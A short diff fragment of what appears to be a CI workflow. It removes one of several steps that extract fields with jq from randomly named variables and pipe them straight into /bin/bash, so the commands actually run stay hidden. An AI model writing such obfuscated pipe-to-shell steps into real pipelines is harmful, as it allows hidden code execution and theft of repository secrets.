@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$unim3" | jq -r .q30 | /bin/bash
           echo $qkdz270 | jq -r .yc6 | /bin/bash
-          printf '%s' "$vtxr86562" | jq -r .eox835 | /bin/bash
           echo $a426 | jq -r .f8 | /bin/bash
           echo $sbpt3 | jq -r .x9 | /bin/bash
 
